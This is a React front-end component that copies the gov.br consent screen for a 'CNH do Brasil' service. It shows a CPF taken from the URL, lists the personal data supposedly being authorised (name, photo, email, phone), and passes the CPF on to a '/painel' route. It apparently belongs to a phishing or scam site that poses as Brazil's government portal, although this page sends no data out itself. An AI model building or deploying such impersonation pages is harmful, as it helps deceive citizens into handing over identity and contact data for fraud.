import { useLocation } from "wouter";
import { GovBrHeader, MobileShell, queryCpf, formatCpf } from "./shared";

export default function CNHAutorizacao() {
  const [, setLocation] = useLocation();
  const cpf = queryCpf();

  return (
    <div className="min-h-screen bg-white text-slate-900">
      <GovBrHeader />
      <MobileShell>
        <div className="flex flex-1 flex-col px-6 pt-8 pb-10">
          <img src="/assets/govbr-logo.png" onError={(e) => { e.currentTarget.src = "/img/logo.png"; }} alt="gov.br" className="mb-8 h-9 w-fit" />
          <div className="flex-1">
            <h1 className="max-w-sm text-[2rem] font-semibold leading-tight text-slate-900">Autorizando acesso...</h1>
            <p className="mt-5 text-base leading-7 text-slate-600">Serviço: <strong>CNH do Brasil</strong></p>
            <ul className="mt-6 space-y-4 text-[15px] text-slate-700">
              {[
                "Identidade gov.br",
                "Nome e foto",
                "Endereço de e-mail",
                "Número de telefone celular",
              ].map((item) => (
                <li key={item} className="flex items-center gap-3">
                  <span className="h-2 w-2 rounded-full bg-[#154294]" />
                  <span>{item}</span>
                </li>
              ))}
            </ul>
            <div className="mt-10 flex items-center gap-4 rounded-3xl border border-blue-100 bg-blue-50 px-5 py-4 text-sm text-[#154294]">
              <div className="h-8 w-8 animate-spin rounded-full border-2 border-[#154294]/20 border-t-[#154294]" />
              Processando autorização para o CPF {formatCpf(cpf)}
            </div>
          </div>
          <div className="mt-8 grid grid-cols-2 gap-4">
            <button
              onClick={() => setLocation("/")}
              className="rounded-full border border-[#154294] px-5 py-4 text-base font-semibold text-[#154294] hover:bg-blue-50 transition"
            >
              Negar
            </button>
            <button
              onClick={() => setLocation(`/painel?cpf=${encodeURIComponent(cpf)}`)}
              className="rounded-full bg-[#154294] px-5 py-4 text-base font-semibold text-white shadow-lg shadow-blue-700/20 hover:bg-[#0f367a] transition"
            >
              Autorizar
            </button>
          </div>
        </div>
      </MobileShell>
    </div>
  );
}
